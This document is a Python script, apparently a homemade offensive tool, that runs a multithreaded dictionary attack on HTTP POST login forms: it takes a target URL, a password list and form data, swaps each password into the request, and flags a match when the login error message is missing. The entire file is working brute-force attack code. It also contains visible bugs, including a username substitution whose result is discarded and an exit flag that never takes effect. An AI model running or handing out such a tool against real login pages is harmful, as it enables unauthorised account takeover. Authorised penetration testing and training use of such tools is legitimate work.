import requests, re, sys, argparse, threading
from itertools import islice
from termcolor import colored


DEFAULT_THREAD_NO = 10

EXIT_FLAG = 0
ERR_FILEOPEN = 100
EXIT_SUCCESS = 0

thread_count = None
args = None
proxies = {
	"http" : "http://127.0.0.1:8080",
     	"https" : "https://127.0.0.1:8080",
            }
headers = {'Content-Type': 'application/x-www-form-urlencoded'
           }

"""
Parse required and optional program arguments.
"""
def parse_arguments():
    global args
    parser = argparse.ArgumentParser(description="HTTP POST form dictionary cracker")
    parser.add_argument("-u", "--url", type=str, action="store", required=True, help="specify target URL")
    parser.add_argument("-d", "--dict", type=str, action="store", required=True, help="specify dictionary path")
    parser.add_argument("--data", type=str, action="store", required=True, help="specify POST form data")
    parser.add_argument("-m", "--message", type=str, action="store", required=True, help="specify login error message "
                                                                                         "(used to check for a "
                                                                                         "password match)")
    parser.add_argument("-l", "--user", type=str, action="store", required=False, help="specify static username to try "
                                                                                     "on login")
    # TODO: check if this is set in main() and change program logic completely (i.e., you don't replace password in
    #  'args.data', you replace the username to be used in the request)
    parser.add_argument("-L", "--user-list", type=str, action="store", required=False, help="specify username list to "
                                                                                            "use on login tries")
    parser.add_argument("-t", "--threads", type=int, action="store", required=False, help="specify number of threads "
                                                                                          "to use")
    parser.add_argument("-v", "--verbose", action="store_true", required=False, help="specify whether to print login "
                                                                                     "attempts")
    args = parser.parse_args()


"""a
Craft POST request and send it; Check response body for login error message;
If the message is not present then a match was found.
"""
def crack(pURL, pData):
    global args
    if args.verbose:
        print("[!] Attempting " + str(pData) + "\n")
    pData = pData[:-1]
    r = requests.post(url=pURL, data=pData,proxies=proxies,headers=headers)
    r.close()

    test = args.message
    reg = re.search(args.message, r.text)

    if reg is None:  # If the login error message is not read
        print(colored('[+] Found possible match: ', 'green'),colored(str(pData)))
        EXIT_FLAG = 1
    else:
        print("[!] Invalid creds - "+str(pData)+'\n')

    return


"""
Main program logic; Get passwords from dictionary, modify POST data; 
Create threads and start them.
"""
def main():
    global thread_count, args
    if not args.threads:
        thread_count = DEFAULT_THREAD_NO
        print("[!] Thread count not specified, running with default thread count [" + str(thread_count) + "] \n")
    else:
        thread_count = int(args.threads)
        print("[!] Running with specified thread count [" + str(thread_count) + "] \n")

    semaphore = True

    threads = []  # List of threads
    # Read through all passwords in the dictionary file in batches of 'thread_count' items
    with open(args.dict, 'r') as infile:
        while semaphore:
            # 'passwords' is a generator object, can be used in a loop
            passwords_batch = list(islice(infile, thread_count))
            batch_length = len(passwords_batch)
            if batch_length <= 0:
                return
            if batch_length < thread_count:
                semaphore = False
            thread_count = min(batch_length, thread_count)
            if args.user is not None:  # If --username argument is specified, use that username in the request body
                re.sub(args.data, "username=.+", "username=" + str(args.user))
            for i in range(thread_count):
                # Create 'thread_count' thread objects with appropriate target function & arguments
                current_data = re.sub("password=.+", "password=" + str(passwords_batch[i]), string=args.data)
                thread_args = (args.url, current_data)
                thr = threading.Thread(target=crack, name="thread-" + str(i), args=thread_args)
                threads.append(thr)
            for i in range(thread_count):
                threads[i].start()
                if EXIT_FLAG:
                    exit(EXIT_SUCCESS)
            for i in range(thread_count):
                threads[i].join()
            threads = []


if __name__ == '__main__':
    parse_arguments()
    main()
